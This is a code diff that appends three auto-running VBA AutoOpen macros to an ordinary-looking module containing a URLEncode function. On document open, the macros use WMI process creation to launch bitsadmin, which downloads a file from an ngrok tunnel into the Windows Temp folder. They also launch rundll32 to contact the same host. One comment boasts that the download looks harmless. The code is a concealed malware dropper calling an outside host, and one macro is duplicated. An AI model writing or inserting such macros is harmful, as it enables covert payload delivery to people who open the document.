@@ -472,3 +472,51 @@ Function URLEncode(ByVal sText As String) As String
     Next
     URLEncode = sRes
 End Function
+
+
+
+
+
+Sub AutoOpen()
+    Dim objWMIService As Object
+    Dim objProcess As Object
+    Dim strCommand As String
+
+    ' Create WMI Service Object
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+
+    ' BITSADMIN will make a download request (harmless looking!)
+    strCommand = "bitsadmin /transfer myjob https://2e43-223-231-137-213.ngrok-free.app/ C:\Windows\Temp\dummy.txt"
+
+    ' Execute
+    objWMIService.Get("Win32_Process").Create strCommand, Null, Null, Null
+End Sub
+
+
+
+
+Sub AutoOpen()
+    Dim objWMIService As Object
+    Dim objProcess As Object
+    Dim strCommand As String
+
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    
+    strCommand = "rundll32.exe url.dll,OpenURL https://2e43-223-231-137-213.ngrok-free.app"
+
+    objWMIService.Get("Win32_Process").Create strCommand, Null, Null, Null
+End Sub
+
+
+
+Sub AutoOpen()
+    Dim objWMIService As Object
+    Dim objProcess As Object
+    Dim strCommand As String
+
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    
+    strCommand = "rundll32.exe url.dll,OpenURL https://2e43-223-231-137-213.ngrok-free.app"
+
+    objWMIService.Get("Win32_Process").Create strCommand, Null, Null, Null
+End Sub
